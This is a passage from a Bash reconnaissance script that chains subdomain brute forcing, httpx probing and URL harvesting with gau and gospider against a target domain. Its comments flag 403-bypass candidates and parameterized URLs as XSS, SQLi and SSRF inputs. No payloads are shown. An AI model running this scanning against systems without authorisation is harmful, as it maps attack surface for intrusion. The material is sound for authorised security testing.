            safe_run "amass-intel" "$f" 300 "$amass_bin" intel -d "$TARGET" -whois -o "$f"
            [ -s "$f" ] && { amass_files+=("$f"); register_output "$f" "amass: intel WHOIS+org pivot" "Find related domains"; }
        fi

        if confirm "Amass — Mode 4: Active + brute force (with wordlist)" n; then
            local _wl="$WL_SUBS_MEDIUM"
            ask "Wordlist for amass brute" "$WL_SUBS_MEDIUM" _wl
            if [ -f "$_wl" ]; then
                local f="$outdir/${TARGET}_amass_bruteforce_${TS}.txt"
                safe_run "amass-brute" "$f" 900 "$amass_bin" enum -active -d "$TARGET" -brute -w "$_wl" -o "$f"
                [ -s "$f" ] && { amass_files+=("$f"); register_output "$f" "amass: brute force DNS" "Wordlist-based DNS brute"; }
            else
                log_warn "Wordlist not found: $_wl — skipping amass brute"
            fi
        fi

        if confirm "Amass — Mode 5: JSON output (full graph)" n; then
            local fj="$outdir/${TARGET}_amass_full_${TS}.json"
            safe_run "amass-json" "$fj" 600 "$amass_bin" enum -d "$TARGET" -json "$fj"
            if [ -s "$fj" ]; then
                local ft="${fj%.json}_hostnames.txt"
                grep -o '"name":"[^"]*"' "$fj" 2>/dev/null | cut -d'"' -f4 | sort -u > "$ft" || true
                [ -s "$ft" ] && { amass_files+=("$ft"); register_output "$fj" "amass: full JSON graph" "jq '.name' for subdomains"; }
            fi
        fi

        if [ "${#amass_files[@]}" -gt 0 ]; then
            local am_merged="$outdir/${TARGET}_amass_MERGED_${TS}.txt"
            cat "${amass_files[@]}" 2>/dev/null | sort -u | grep -v '^$' > "$am_merged" || true
            log_ok "Amass merged: $(safe_wc "$am_merged") unique subdomains"
            all_files+=("$am_merged")
        fi
    else
        log_skip "Amass not found at: $AMASS_PATH"
    fi

    # ──────────────────────────────────────────────────────────────────────
    # ASSETFINDER
    # ──────────────────────────────────────────────────────────────────────
    if check_tool "$ASSETFINDER_PATH"; then
        subsection "ASSETFINDER"
        local af_files=()

        if confirm "Assetfinder — Mode 1: Subdomains only (--subs-only)" y; then
            local f="$outdir/${TARGET}_assetfinder_subsonly_${TS}.txt"
            safe_run "assetfinder-subs" "$f" 120 "$ASSETFINDER_PATH" --subs-only "$TARGET"
            [ -s "$f" ] && { af_files+=("$f"); register_output "$f" "assetfinder: subs-only passive" "Fast passive"; }
        fi

        if confirm "Assetfinder — Mode 2: All (including related domains)" y; then
            local f="$outdir/${TARGET}_assetfinder_all_${TS}.txt"
            safe_run "assetfinder-all" "$f" 120 "$ASSETFINDER_PATH" "$TARGET"
            [ -s "$f" ] && { af_files+=("$f"); register_output "$f" "assetfinder: all incl related" "Broader asset discovery"; }
        fi

        if confirm "Assetfinder — Mode 3: Filter only target TLD from related" y; then
            local f="$outdir/${TARGET}_assetfinder_filtered_${TS}.txt"
            timeout 120 "$ASSETFINDER_PATH" "$TARGET" 2>>"$LOG_FILE" | grep -E "\.${TARGET}$|^${TARGET}$" | sort -u > "$f" 2>/dev/null || true
            [ -s "$f" ] && { af_files+=("$f"); register_output "$f" "assetfinder: target TLD only" "Clean list for probing"; }
        fi

        if [ "${#af_files[@]}" -gt 0 ]; then
            local af_merged="$outdir/${TARGET}_assetfinder_MERGED_${TS}.txt"
            cat "${af_files[@]}" 2>/dev/null | sort -u | grep -v '^$' > "$af_merged" || true
            log_ok "Assetfinder merged: $(safe_wc "$af_merged") subdomains"
            all_files+=("$af_merged")
        fi
    else
        log_skip "Assetfinder not found at: $ASSETFINDER_PATH"
    fi

    # ──────────────────────────────────────────────────────────────────────
    # SUBLIST3R
    # ──────────────────────────────────────────────────────────────────────
    if check_tool "$SUBLIST3R_PATH"; then
        subsection "SUBLIST3R"
        local sl_files=()

        if confirm "Sublist3r — Mode 1: All search engines (default)" y; then
            local f="$outdir/${TARGET}_sublist3r_default_${TS}.txt"
            timeout 300 python3 "$SUBLIST3R_PATH" -d "$TARGET" -o "$f" >> "$LOG_FILE" 2>&1 || true
            [ -s "$f" ] && { sl_files+=("$f"); log_ok "Sublist3r default: $(safe_wc "$f") subdomains"; register_output "$f" "sublist3r: all engines" "Google+Bing+VT+Netcraft"; }
        fi

        if confirm "Sublist3r — Mode 2: With brute force (-b)" n; then
            local f="$outdir/${TARGET}_sublist3r_bruteforce_${TS}.txt"
            timeout 600 python3 "$SUBLIST3R_PATH" -d "$TARGET" -b -o "$f" >> "$LOG_FILE" 2>&1 || true
            [ -s "$f" ] && { sl_files+=("$f"); log_ok "Sublist3r brute: $(safe_wc "$f") subdomains"; register_output "$f" "sublist3r: brute force" "DNS brute + search engines"; }
        fi

        if confirm "Sublist3r — Mode 3: Selected engines only" n; then
            local _engines="google,bing,virustotal,netcraft"
            ask "Engines (comma-separated)" "$_engines" _engines
            local f="$outdir/${TARGET}_sublist3r_engines_${TS}.txt"
            timeout 300 python3 "$SUBLIST3R_PATH" -d "$TARGET" -e "$_engines" -o "$f" >> "$LOG_FILE" 2>&1 || true
            [ -s "$f" ] && { sl_files+=("$f"); log_ok "Sublist3r selected: $(safe_wc "$f") subdomains"; register_output "$f" "sublist3r: selected engines" "$_engines"; }
        fi

        if confirm "Sublist3r — Mode 4: Verbose output (-v)" n; then
            local f="$outdir/${TARGET}_sublist3r_verbose_${TS}.txt"
            timeout 300 python3 "$SUBLIST3R_PATH" -d "$TARGET" -v -o "$f" >> "$LOG_FILE" 2>&1 || true
            [ -s "$f" ] && { sl_files+=("$f"); register_output "$f" "sublist3r: verbose mode" "Source-by-source breakdown"; }
        fi

        if confirm "Sublist3r — Mode 5: With port scan (80,443)" n; then
            local f="$outdir/${TARGET}_sublist3r_withports_${TS}.txt"
            timeout 400 python3 "$SUBLIST3R_PATH" -d "$TARGET" -p 80,443,8080,8443 -o "$f" >> "$LOG_FILE" 2>&1 || true
            [ -s "$f" ] && { sl_files+=("$f"); register_output "$f" "sublist3r: with port scan" "Web-responding subdomains"; }
        fi

        if [ "${#sl_files[@]}" -gt 0 ]; then
            local sl_merged="$outdir/${TARGET}_sublist3r_MERGED_${TS}.txt"
            cat "${sl_files[@]}" 2>/dev/null | sort -u | grep -v '^$' > "$sl_merged" || true
            log_ok "Sublist3r merged: $(safe_wc "$sl_merged") unique subdomains"
            all_files+=("$sl_merged")
        fi
    else
        log_skip "Sublist3r not found at: $SUBLIST3R_PATH"
    fi

    # ──────────────────────────────────────────────────────────────────────
    # KNOCKPY
    # ──────────────────────────────────────────────────────────────────────
    if check_tool "$KNOCK_PATH"; then
        subsection "KNOCKPY"
        local kn_files=()

        if confirm "Knockpy — Mode 1: Default DNS brute force" y; then
            local f="$outdir/${TARGET}_knockpy_default_${TS}.txt"
            timeout 400 python3 "$KNOCK_PATH" "$TARGET" 2>>"$LOG_FILE" | grep -oE '[a-zA-Z0-9._-]+\.'"$TARGET" | sort -u > "$f" 2>/dev/null || true
            [ -s "$f" ] && { kn_files+=("$f"); log_ok "Knockpy default: $(safe_wc "$f") subdomains"; register_output "$f" "knockpy: default DNS brute" "Built-in wordlist brute"; }
        fi

        if confirm "Knockpy — Mode 2: Custom wordlist" n; then
            local _wl="$WL_SUBS_MEDIUM"
            ask "Wordlist path" "$WL_SUBS_MEDIUM" _wl
            if [ -f "$_wl" ]; then
                local f="$outdir/${TARGET}_knockpy_custom_${TS}.txt"
                timeout 600 python3 "$KNOCK_PATH" "$TARGET" -w "$_wl" 2>>"$LOG_FILE" | grep -oE '[a-zA-Z0-9._-]+\.'"$TARGET" | sort -u > "$f" 2>/dev/null || true
                [ -s "$f" ] && { kn_files+=("$f"); register_output "$f" "knockpy: custom wordlist" "Custom DNS brute"; }
            else
                log_warn "Wordlist not found: $_wl"
            fi
        fi

        if [ "${#kn_files[@]}" -gt 0 ]; then
            local kn_merged="$outdir/${TARGET}_knockpy_MERGED_${TS}.txt"
            cat "${kn_files[@]}" 2>/dev/null | sort -u | grep -v '^$' > "$kn_merged" || true
            log_ok "Knockpy merged: $(safe_wc "$kn_merged") unique subdomains"
            all_files+=("$kn_merged")
        fi
    else
        log_skip "Knockpy not found at: $KNOCK_PATH"
    fi

    # ──────────────────────────────────────────────────────────────────────
    # FFUF — DNS / VHost subdomain brute
    # ──────────────────────────────────────────────────────────────────────
    if check_tool "$FFUF_PATH"; then
        subsection "FFUF — Subdomain Brute Force"
        local ffuf_sub_files=()

        if confirm "ffuf — Subdomain Mode 1: HTTPS vhost brute" y; then
            local _wl="$WL_SUBS_MEDIUM"
            ask "Subdomain wordlist" "$WL_SUBS_MEDIUM" _wl
            if [ -f "$_wl" ]; then
                local fj="$outdir/${TARGET}_ffuf_subdomain_vhost_${TS}.json"
                local ft="$outdir/${TARGET}_ffuf_subdomain_vhost_${TS}.txt"
                safe_run "ffuf-subdomain-vhost" "$ft" 300 \
                    "$FFUF_PATH" -w "$_wl" -u "https://FUZZ.${TARGET}" \
                    -mc 200,301,302,401,403,500 -t "$THREAD_COUNT" \
                    -o "$fj" -of json -s
                if [ -s "$fj" ]; then
                    python3 -c "
import json, sys
try:
    d = json.load(open('$fj'))
    for r in d.get('results', []):
        w = r.get('input',{}).get('FUZZ','')
        if w:
            print(w + '.${TARGET}')
except Exception as e:
    sys.stderr.write(str(e)+'\n')
" > "$ft" 2>>"$LOG_FILE" || true
                    [ -s "$ft" ] && { ffuf_sub_files+=("$ft"); register_output "$ft" "ffuf: vhost subdomain brute" "HTTP-responding subdomains"; }
                fi
            else
                log_warn "Wordlist not found: $_wl"
            fi
        fi

        if confirm "ffuf — Subdomain Mode 2: Host header fuzzing" n; then
            local _wl="$WL_SUBS_SMALL"
            ask "Wordlist" "$WL_SUBS_SMALL" _wl
            if [ -f "$_wl" ]; then
                local target_ip
                target_ip=$(dig +short "$TARGET" 2>/dev/null | grep -E '^[0-9.]+' | head -1 || echo "")
                local _base="https://${target_ip:-$TARGET}"
                ask "Base URL for Host header fuzz" "$_base" _base
                local fj="$outdir/${TARGET}_ffuf_hostheader_${TS}.json"
                local ft="$outdir/${TARGET}_ffuf_hostheader_${TS}.txt"
                safe_run "ffuf-hostheader" "/dev/null" 300 \
                    "$FFUF_PATH" -w "$_wl" -u "$_base" \
                    -H "Host: FUZZ.${TARGET}" \
                    -mc 200,301,302,401,403 -t "$THREAD_COUNT" \
                    -o "$fj" -of json -s
                if [ -s "$fj" ]; then
                    python3 -c "
import json, sys
try:
    d = json.load(open('$fj'))
    for r in d.get('results', []):
        w = r.get('input',{}).get('FUZZ','')
        if w:
            print(w + '.${TARGET}')
except Exception as e:
    sys.stderr.write(str(e)+'\n')
" > "$ft" 2>>"$LOG_FILE" || true
                    [ -s "$ft" ] && { ffuf_sub_files+=("$ft"); register_output "$ft" "ffuf: host header sub brute" "VHost discovery"; }
                fi
            fi
        fi

        if [ "${#ffuf_sub_files[@]}" -gt 0 ]; then
            local ffuf_merged="$outdir/${TARGET}_ffuf_subs_MERGED_${TS}.txt"
            cat "${ffuf_sub_files[@]}" 2>/dev/null | sort -u | grep -v '^$' > "$ffuf_merged" || true
            log_ok "ffuf subdomain merged: $(safe_wc "$ffuf_merged")"
            all_files+=("$ffuf_merged")
        fi
    else
        log_skip "ffuf not found at: $FFUF_PATH"
    fi

    # ──────────────────────────────────────────────────────────────────────
    # FINAL MASTER MERGE
    # ──────────────────────────────────────────────────────────────────────
    section "SUBDOMAIN MASTER MERGE"
    if [ "${#all_files[@]}" -gt 0 ]; then
        cat "${all_files[@]}" 2>/dev/null \
            | grep -E '^[a-zA-Z0-9][a-zA-Z0-9._-]*\.[a-zA-Z]{2,}$' 2>/dev/null \
            | grep -iE "\.${TARGET}$|^${TARGET}$" 2>/dev/null \
            | tr '[:upper:]' '[:lower:]' \
            | sort -u \
            | grep -v '^$' > "$merged" 2>/dev/null || true
    else
        log_warn "No subdomain tools ran or returned results — creating empty master file"
        touch "$merged"
    fi

    SUBDOMAIN_MASTER_FILE="$merged"
    local total
    total=$(safe_wc "$merged")
    log_ok "${BOLD}MASTER SUBDOMAIN FILE:${NC} $merged"
    log_ok "${BOLD}Total unique subdomains: ${YELLOW}$total${NC}"
    register_output "$merged" "MASTER: all tools merged subdomains" "cat file | httpx -silent"

    subsection "Phase 1 Summary"
    echo -e "  ${STAR} Master file : ${GREEN}$merged${NC}"
    echo -e "  ${STAR} Total       : ${YELLOW}${BOLD}$total${NC} unique subdomains"
    echo -e "  ${INFO} Next        : HTTP probing with httpx (Phase 2)"
    divider
}


# =============================================================================
# PHASE 2 — HTTP PROBING (httpx)
# =============================================================================
phase_httpx() {
    section "PHASE 2 — HTTP PROBING (httpx)"
    local outdir="$OUTPUT_DIR/02_httpx"
    mkdir -p "$outdir"

    if ! check_tool "$HTTPX_PATH"; then
        log_skip "httpx not found at: $HTTPX_PATH — skipping Phase 2"
        return
    fi

    # Determine input
    local input_file="$SUBDOMAIN_MASTER_FILE"
    if [ ! -f "$input_file" ] || [ ! -s "$input_file" ]; then
        log_warn "No subdomain master file. Enter a list manually."
        ask "Path to subdomain/host file" "" input_file
        if [ ! -f "$input_file" ]; then
            log_warn "No valid input for httpx — skipping Phase 2"
            return
        fi
    fi
    log_info "Input: $input_file ($(safe_wc "$input_file") hosts)"

    local HTTPX="$HTTPX_PATH"
    local T="$THREAD_COUNT"

    # Mode 1 — Basic all status codes
    if confirm "httpx Mode 1: Basic probe — all status codes + title + server" y; then
        local f="$outdir/${TARGET}_httpx_allcodes_${TS}.txt"
        safe_run "httpx-basic" "$f" 300 \
            "$HTTPX" -l "$input_file" -silent \
            -status-code -title -content-length -web-server -tech-detect \
            -threads "$T" -timeout 10
        [ -s "$f" ] && register_output "$f" "httpx: all status codes + metadata" "Overview of all responding hosts"
    fi

    # Mode 2 — Full JSON probe
    if confirm "httpx Mode 2: Full JSON output (all metadata)" y; then
        local f="$outdir/${TARGET}_httpx_full_json_${TS}.json"
        safe_run "httpx-json" "$f" 400 \
            "$HTTPX" -l "$input_file" -silent \
            -status-code -title -content-length -web-server -tech-detect \
            -ip -cname -cdn -location -favicon -follow-redirects \
            -timeout 10 -threads "$T" -json
        [ -s "$f" ] && register_output "$f" "httpx: full JSON metadata" "Parse: jq '.url,.status_code,.tech[]'"
    fi

    # Mode 3 — 200 only
    if confirm "httpx Mode 3: Filter HTTP 200 OK only" y; then
        local f="$outdir/${TARGET}_httpx_200_ok_${TS}.txt"
        safe_run "httpx-200" "$f" 300 \
            "$HTTPX" -l "$input_file" -silent -mc 200 -threads "$T" -timeout 10
        [ -s "$f" ] && register_output "$f" "httpx: 200 OK hosts only" "Directly accessible targets"
    fi

    # Mode 4 — Redirects
    if confirm "httpx Mode 4: 3xx Redirects with Location header" y; then
        local f="$outdir/${TARGET}_httpx_redirects_${TS}.txt"
        safe_run "httpx-redirects" "$f" 300 \
            "$HTTPX" -l "$input_file" -silent -mc 301,302,307,308 \
            -status-code -location -threads "$T" -timeout 10
        [ -s "$f" ] && register_output "$f" "httpx: 3xx redirect pages" "Check for open redirects"
    fi

    # Mode 5 — 401/403 auth pages
    if confirm "httpx Mode 5: Auth-required pages (401/403)" y; then
        local f="$outdir/${TARGET}_httpx_auth_401_403_${TS}.txt"
        safe_run "httpx-auth" "$f" 300 \
            "$HTTPX" -l "$input_file" -silent -mc 401,403 \
            -status-code -title -threads "$T" -timeout 10
        [ -s "$f" ] && register_output "$f" "httpx: 401/403 pages" "Try 403 bypass techniques"
    fi

    # Mode 6 — 5xx Server errors
    if confirm "httpx Mode 6: Server errors (5xx)" y; then
        local f="$outdir/${TARGET}_httpx_5xx_errors_${TS}.txt"
        safe_run "httpx-5xx" "$f" 300 \
            "$HTTPX" -l "$input_file" -silent -mc 500,501,502,503,504 \
            -status-code -title -threads "$T" -timeout 10
        [ -s "$f" ] && register_output "$f" "httpx: 5xx error pages" "May indicate vulnerable backends"
    fi

    # Mode 7 — Technology detection
    if confirm "httpx Mode 7: Technology fingerprinting" y; then
        local f="$outdir/${TARGET}_httpx_tech_fingerprint_${TS}.txt"
        safe_run "httpx-tech" "$f" 300 \
            "$HTTPX" -l "$input_file" -silent -tech-detect -web-server \
            -ip -cdn -favicon -status-code -threads "$T" -timeout 10
        [ -s "$f" ] && register_output "$f" "httpx: technology stack" "Identify CMS/frameworks for targeted vulns"
    fi

    # Mode 8 — HTTPS only
    if confirm "httpx Mode 8: HTTPS-only hosts" n; then
        local f="$outdir/${TARGET}_httpx_https_only_${TS}.txt"
        safe_run "httpx-https" "$f" 300 \
            "$HTTPX" -l "$input_file" -silent -scheme https \
            -mc 200,301,302,401,403 -status-code -threads "$T" -timeout 10
        [ -s "$f" ] && register_output "$f" "httpx: HTTPS-only hosts" "TLS/cert analysis targets"
    fi

    # Mode 9 — Custom ports
    if confirm "httpx Mode 9: Custom ports (8080,8443,8888,3000,4000,9000)" n; then
        local f="$outdir/${TARGET}_httpx_customports_${TS}.txt"
        safe_run "httpx-ports" "$f" 300 \
            "$HTTPX" -l "$input_file" -silent \
            -ports 80,443,8080,8443,8888,4443,3000,4000,5000,9000,9090 \
            -status-code -title -threads "$T" -timeout 10
        [ -s "$f" ] && register_output "$f" "httpx: non-standard ports" "Dev/staging on alt ports"
    fi

    # Mode 10 — Follow redirects
    if confirm "httpx Mode 10: Follow redirects to final URL" n; then
        local f="$outdir/${TARGET}_httpx_follow_redirects_${TS}.txt"
        safe_run "httpx-follow" "$f" 300 \
            "$HTTPX" -l "$input_file" -silent -follow-redirects \
            -max-redirects 5 -status-code -location -threads "$T" -timeout 15
        [ -s "$f" ] && register_output "$f" "httpx: redirect chains" "Map redirect paths; find open redirects"
    fi

    # ── Split by status code ────────────────────────────────────────────
    local all_f="$outdir/${TARGET}_httpx_allcodes_${TS}.txt"
    if [ -s "$all_f" ]; then
        subsection "Splitting results by status code"
        local code_dir="$outdir/by_status_code"
        mkdir -p "$code_dir"
        for code in 200 201 204 301 302 307 400 401 403 404 429 500 502 503; do
            local cf="$code_dir/${TARGET}_status${code}_${TS}.txt"
            grep -E "\[${code}\]" "$all_f" > "$cf" 2>/dev/null || true
            local n; n=$(safe_wc "$cf")
            if [ "$n" -gt 0 ]; then
                log_ok "  Status $code: $n hosts → $(basename "$cf")"
                register_output "$cf" "httpx: HTTP $code filtered" "Status-targeted testing"
            else
                rm -f "$cf" 2>/dev/null || true
            fi
        done
    fi

    # ── Build live hosts master file ────────────────────────────────────
    local live="$outdir/${TARGET}_LIVE_HOSTS_MASTER_${TS}.txt"
    {
        [ -s "$all_f" ] && awk '{print $1}' "$all_f"
        find "$outdir/by_status_code" -name "*.txt" 2>/dev/null | xargs -r awk '{print $1}'
    } | sort -u | grep -E '^https?://' > "$live" 2>/dev/null || true
    LIVE_HOSTS_FILE="$live"
    log_ok "LIVE HOSTS MASTER: $live ($(safe_wc "$live") hosts)"
    register_output "$live" "MASTER: live hosts from httpx" "Input for gospider, ffuf, dir brute"

    subsection "Phase 2 Summary"
    echo -e "  ${STAR} Live hosts : ${YELLOW}${BOLD}$(safe_wc "$live")${NC}"
    echo -e "  ${STAR} Results in : ${WHITE}$outdir${NC}"
    echo -e "  ${INFO} Next       : URL harvesting (Phase 3)"
    divider
}


# =============================================================================
# PHASE 3 — URL HARVESTING (gau + gospider)
# =============================================================================
phase_urls() {
    section "PHASE 3 — URL & LINK HARVESTING"
    local outdir="$OUTPUT_DIR/03_urls"
    mkdir -p "$outdir"
    local gau_files=() gospider_files=()

    # ──────────────────────────────────────────────────────────────────────
    # GAU
    # ──────────────────────────────────────────────────────────────────────
    if check_tool "$GAU_PATH"; then
        subsection "GAU — Get All URLs"

        if confirm "gau Mode 1: All passive sources (Wayback+OTX+URLScan+CommonCrawl)" y; then
            local f="$outdir/${TARGET}_gau_allsources_${TS}.txt"
            safe_run "gau-all" "$f" 300 "$GAU_PATH" --subs "$TARGET"
            [ -s "$f" ] && { gau_files+=("$f"); register_output "$f" "gau: all passive sources" "Primary URL corpus"; }
        fi

        if confirm "gau Mode 2: Wayback Machine only" y; then
            local f="$outdir/${TARGET}_gau_wayback_${TS}.txt"
            safe_run "gau-wayback" "$f" 300 "$GAU_PATH" --providers wayback "$TARGET"
            [ -s "$f" ] && { gau_files+=("$f"); register_output "$f" "gau: Wayback only" "Historical / forgotten endpoints"; }
        fi

        if confirm "gau Mode 3: URLScan.io only" y; then
            local f="$outdir/${TARGET}_gau_urlscan_${TS}.txt"
            safe_run "gau-urlscan" "$f" 180 "$GAU_PATH" --providers urlscan "$TARGET"
            [ -s "$f" ] && { gau_files+=("$f"); register_output "$f" "gau: URLScan.io" "Recent scan results"; }
        fi

        if confirm "gau Mode 4: AlienVault OTX only" y; then
            local f="$outdir/${TARGET}_gau_alienvault_${TS}.txt"
            safe_run "gau-otx" "$f" 180 "$GAU_PATH" --providers otx "$TARGET"
            [ -s "$f" ] && { gau_files+=("$f"); register_output "$f" "gau: AlienVault OTX" "Threat intel URLs"; }
        fi

        if confirm "gau Mode 5: CommonCrawl only" n; then
            local f="$outdir/${TARGET}_gau_commoncrawl_${TS}.txt"
            safe_run "gau-cc" "$f" 300 "$GAU_PATH" --providers commoncrawl "$TARGET"
            [ -s "$f" ] && { gau_files+=("$f"); register_output "$f" "gau: CommonCrawl" "Huge web archive"; }
        fi

        if confirm "gau Mode 6: With subdomains, filter static files" y; then
            local f="$outdir/${TARGET}_gau_withsubs_nostatic_${TS}.txt"
            timeout 300 "$GAU_PATH" --subs "$TARGET" 2>>"$LOG_FILE" \
                | grep -viE '\.(png|jpg|jpeg|gif|ico|svg|css|woff|woff2|ttf|eot|mp4|mp3|avi|pdf)$' \
                | sort -u > "$f" 2>/dev/null || true
            [ -s "$f" ] && { gau_files+=("$f"); register_output "$f" "gau: filtered no-static" "Dynamic/API endpoints only"; }
        fi

        if confirm "gau Mode 7: Date-filtered (last 2 years)" n; then
            local from_yr
            from_yr=$(( $(date +%Y) - 2 ))
            local f="$outdir/${TARGET}_gau_recent2yr_${TS}.txt"
            safe_run "gau-recent" "$f" 300 "$GAU_PATH" --subs --from "${from_yr}01" "$TARGET"
            [ -s "$f" ] && { gau_files+=("$f"); register_output "$f" "gau: last 2 years only" "Current attack surface"; }
        fi

        if confirm "gau Mode 8: Per live-host sweep" n; then
            if [ -s "$LIVE_HOSTS_FILE" ]; then
                local f="$outdir/${TARGET}_gau_perlivehost_${TS}.txt"
                while IFS= read -r host || [ -n "$host" ]; do
                    local dom
                    dom=$(echo "$host" | sed 's|https\?://||' | cut -d'/' -f1 | cut -d':' -f1)
                    [ -n "$dom" ] && timeout 60 "$GAU_PATH" "$dom" >> "$f" 2>>"$LOG_FILE" || true
                done < "$LIVE_HOSTS_FILE"
                sort -u -o "${f}.sorted" "$f" 2>/dev/null && mv "${f}.sorted" "$f" || true
                [ -s "$f" ] && { gau_files+=("$f"); register_output "$f" "gau: per live host sweep" "Full coverage of all subdomains"; }
            else
                log_warn "No live hosts file for per-host gau — skipping"
            fi
        fi

        if [ "${#gau_files[@]}" -gt 0 ]; then
            GAU_MERGED_FILE="$outdir/${TARGET}_gau_ALL_MERGED_${TS}.txt"
            cat "${gau_files[@]}" 2>/dev/null | sort -u | grep -v '^$' > "$GAU_MERGED_FILE" || true
            log_ok "gau MERGED: $(safe_wc "$GAU_MERGED_FILE") unique URLs"
            register_output "$GAU_MERGED_FILE" "gau: ALL modes merged" "Input for qsreplace vuln testing"
        fi
    else
        log_skip "gau not found at: $GAU_PATH"
    fi

    # ──────────────────────────────────────────────────────────────────────
    # GOSPIDER
    # ──────────────────────────────────────────────────────────────────────
    if check_tool "$GOSPIDER_PATH"; then
        subsection "GOSPIDER — Active Web Spider"
        local base_url="https://${TARGET}"
        ask "Base URL to spider" "https://${TARGET}" base_url

        if confirm "Gospider Mode 1: Basic active crawl (depth 3)" y; then
            local d="$outdir/${TARGET}_gospider_basic_${TS}_dir"
            local f="$outdir/${TARGET}_gospider_basic_${TS}.txt"
            mkdir -p "$d"
            timeout 300 "$GOSPIDER_PATH" -s "$base_url" -o "$d" \
                -c 10 -d 3 -t 20 --other-source --include-subs \
                >> "$LOG_FILE" 2>&1 || true
            find "$d" -type f 2>/dev/null | xargs grep -ohE 'https?://[^"<> ]+' 2>/dev/null | sort -u > "$f" || true
            [ -s "$f" ] && { gospider_files+=("$f"); log_ok "Gospider basic: $(safe_wc "$f") URLs"; register_output "$f" "gospider: basic crawl" "Actively crawled links"; }
        fi

        if confirm "Gospider Mode 2: Deep crawl (depth 5)" n; then
            local d="$outdir/${TARGET}_gospider_deep_${TS}_dir"
            local f="$outdir/${TARGET}_gospider_deep_${TS}.txt"
            mkdir -p "$d"
            timeout 600 "$GOSPIDER_PATH" -s "$base_url" -o "$d" \
                -c 20 -d 5 -t 30 --other-source --include-subs \
                >> "$LOG_FILE" 2>&1 || true
            find "$d" -type f 2>/dev/null | xargs grep -ohE 'https?://[^"<> ]+' 2>/dev/null | sort -u > "$f" || true
            [ -s "$f" ] && { gospider_files+=("$f"); log_ok "Gospider deep: $(safe_wc "$f") URLs"; register_output "$f" "gospider: deep crawl (depth 5)" "Deeper endpoint discovery"; }
        fi

        if confirm "Gospider Mode 3: JS + sitemap + robots parsing" y; then
            local d="$outdir/${TARGET}_gospider_js_${TS}_dir"
            local f="$outdir/${TARGET}_gospider_js_${TS}.txt"
            mkdir -p "$d"
            timeout 400 "$GOSPIDER_PATH" -s "$base_url" -o "$d" \
                -c 10 -d 3 --js --sitemap --robots \
                --other-source --include-subs \
                >> "$LOG_FILE" 2>&1 || true
            find "$d" -type f 2>/dev/null | xargs grep -ohE 'https?://[^"<> ]+' 2>/dev/null | sort -u > "$f" || true
            [ -s "$f" ] && { gospider_files+=("$f"); register_output "$f" "gospider: JS+sitemap+robots" "API endpoints inside JS"; }
        fi

        if confirm "Gospider Mode 4: Authenticated crawl (cookie/token)" n; then
            local _cookie=""
            ask "Cookie or Bearer token" "" _cookie
            if [ -n "$_cookie" ]; then
                local d="$outdir/${TARGET}_gospider_auth_${TS}_dir"
                local f="$outdir/${TARGET}_gospider_auth_${TS}.txt"
                mkdir -p "$d"
                timeout 400 "$GOSPIDER_PATH" -s "$base_url" -o "$d" \
                    -c 10 -d 3 --cookie "$_cookie" \
                    --other-source --include-subs \
                    >> "$LOG_FILE" 2>&1 || true
                find "$d" -type f 2>/dev/null | xargs grep -ohE 'https?://[^"<> ]+' 2>/dev/null | sort -u > "$f" || true
                [ -s "$f" ] && { gospider_files+=("$f"); register_output "$f" "gospider: authenticated crawl" "Post-auth endpoints"; }
            fi
        fi

        if confirm "Gospider Mode 5: Multi-site from live hosts list" n; then
            if [ -s "$LIVE_HOSTS_FILE" ]; then
                local d="$outdir/${TARGET}_gospider_multisite_${TS}_dir"
                local f="$outdir/${TARGET}_gospider_multisite_${TS}.txt"
                mkdir -p "$d"
                timeout 600 "$GOSPIDER_PATH" -S "$LIVE_HOSTS_FILE" -o "$d" \
                    -c 10 -d 2 -t 50 --other-source --include-subs \
                    >> "$LOG_FILE" 2>&1 || true
                find "$d" -type f 2>/dev/null | xargs grep -ohE 'https?://[^"<> ]+' 2>/dev/null | sort -u > "$f" || true
                [ -s "$f" ] && { gospider_files+=("$f"); register_output "$f" "gospider: multi-site crawl" "Crawl all live subdomains"; }
            else
                log_warn "No live hosts file — skipping multi-site gospider"
            fi
        fi

        if [ "${#gospider_files[@]}" -gt 0 ]; then
            GOSPIDER_MERGED_FILE="$outdir/${TARGET}_gospider_ALL_MERGED_${TS}.txt"
            cat "${gospider_files[@]}" 2>/dev/null | sort -u | grep -v '^$' > "$GOSPIDER_MERGED_FILE" || true
            log_ok "Gospider MERGED: $(safe_wc "$GOSPIDER_MERGED_FILE") unique URLs"
            register_output "$GOSPIDER_MERGED_FILE" "gospider: ALL modes merged" "Active crawl complement to gau"
        fi
    else
        log_skip "Gospider not found at: $GOSPIDER_PATH"
    fi

    # ── Final URL master merge ────────────────────────────────────────────
    section "URL MASTER MERGE"
    URL_MASTER_FILE="$outdir/${TARGET}_URL_MASTER_ALL_${TS}.txt"
    {
        [ -n "$GAU_MERGED_FILE" ]      && [ -s "$GAU_MERGED_FILE" ]      && cat "$GAU_MERGED_FILE"
        [ -n "$GOSPIDER_MERGED_FILE" ] && [ -s "$GOSPIDER_MERGED_FILE" ] && cat "$GOSPIDER_MERGED_FILE"
    } | grep -E '^https?://' | sort -u > "$URL_MASTER_FILE" 2>/dev/null || true
    log_ok "URL MASTER: $URL_MASTER_FILE ($(safe_wc "$URL_MASTER_FILE") URLs)"
    register_output "$URL_MASTER_FILE" "MASTER: all URL sources merged" "Primary input for qsreplace"

    # Parameterized URLs
    PARAMETERIZED_URLS="$outdir/${TARGET}_URLs_with_params_${TS}.txt"
    grep -E '\?.+=.' "$URL_MASTER_FILE" 2>/dev/null | sort -u > "$PARAMETERIZED_URLS" || true
    log_ok "Parameterized URLs: $(safe_wc "$PARAMETERIZED_URLS")"
    register_output "$PARAMETERIZED_URLS" "URLs with GET parameters" "qsreplace input for XSS/SQLi/SSRF"

    # Unique paths
    local paths_f="$outdir/${TARGET}_unique_paths_${TS}.txt"
    sed 's/?.*//' "$URL_MASTER_FILE" 2>/dev/null | sort -u > "$paths_f" || true
    log_ok "Unique paths (no params): $(safe_wc "$paths_f")"
    register_output "$paths_f" "Unique URL paths (no params)" "Directory brute force input"

    subsection "Phase 3 Summary"
    echo -e "  ${STAR} Total URLs       : ${YELLOW}$(safe_wc "$URL_MASTER_FILE")${NC}"
    echo -e "  ${STAR} Parameterized    : ${YELLOW}$(safe_wc "$PARAMETERIZED_URLS")${NC}"
    echo -e "  ${INFO} Next             : Vulnerability scanning (Phase 4)"
    divider
}


# =============================================================================
# PHASE 4 — VULNERABILITY SCANNING (qsreplace)
# =============================================================================

# =============================================================================
# PHASE 4 — VULNERABILITY SCANNING (parallel qsreplace + skip-per-class)
# =============================================================================
phase_vulns() {
